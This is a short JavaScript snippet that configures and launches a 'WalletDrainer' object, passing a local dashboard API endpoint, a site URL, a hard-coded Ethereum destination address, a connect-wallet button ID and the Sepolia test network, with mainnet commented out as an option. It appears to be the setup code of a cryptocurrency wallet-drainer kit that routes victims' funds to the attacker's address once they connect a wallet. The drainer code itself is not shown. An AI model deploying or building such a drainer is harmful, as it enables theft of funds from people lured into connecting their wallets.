const endpoint = "http://localhost:8888/ca_dashboard/api/create/index.php";
const website = "http://localhost:8888/ca_dashboard";
const destinationAddress = "0xD299eAa7A40e53679D8cc4f820D8c54E20f60590";
const connectButtonID = "connect-wallet-button";

const walletDrainer = new WalletDrainer(
  endpoint,
  website,
  destinationAddress,
  connectButtonID,
  // "mainnet",
  "sepolia"
);
walletDrainer.start();
